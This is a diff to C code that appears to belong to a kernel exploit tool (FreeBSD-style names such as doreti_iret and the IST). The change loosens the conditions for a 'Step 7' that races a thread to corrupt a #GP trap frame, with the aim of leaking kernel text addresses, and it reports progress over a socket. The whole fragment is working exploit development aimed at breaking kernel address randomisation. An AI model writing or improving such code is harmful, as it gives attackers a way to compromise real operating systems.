@@ -3994,10 +3994,28 @@ broad_done:
      *   4. Trigger iretq with non-canonical RIP -> #GP
      *   5. Writer thread overwrites CS on our IST page -> SIGBUS to userspace
      *   6. Signal handler reads doreti_iret from mc_rip
+     *
+     * Trigger when: no candidates at all, OR all candidates are low-confidence
+     * (no swapgs, no handler proximity => none would classify as LIKELY/POSSIBLE).
      */
-    if (num_candidates == 0 && have_text_pa) {
+    {
+        int have_strong_candidate = 0;
+        for (int c = 0; c < num_candidates; c++) {
+            int near_gp = (candidates[c].near_handler == 13 &&
+                           candidates[c].page_dist <= 16);
+            if (candidates[c].has_swapgs_before || near_gp) {
+                have_strong_candidate = 1;
+                break;
+            }
+        }
+
+    if (!have_strong_candidate && have_text_pa) {
         send_response(sock, "\n--- Step 7: #GP Trap Frame Method ---\n");
-        send_response(sock, "All previous steps found 0 candidates; trying IST race.\n\n");
+        if (num_candidates == 0)
+            send_response(sock, "No candidates from previous steps; trying IST race.\n\n");
+        else
+            send_response(sock, "All %d candidates are low-confidence (no swapgs, no handler "
+                          "proximity); trying IST race.\n\n", num_candidates);
 
         /* State for cleanup */
         void *ist_page = NULL;
@@ -4350,6 +4368,7 @@ broad_done:
 
         send_response(sock, "Step 7 cleanup complete\n");
     }
+    } /* end have_strong_candidate check */
 
     /* ---- Step 8: Classification ---- */
 classify:
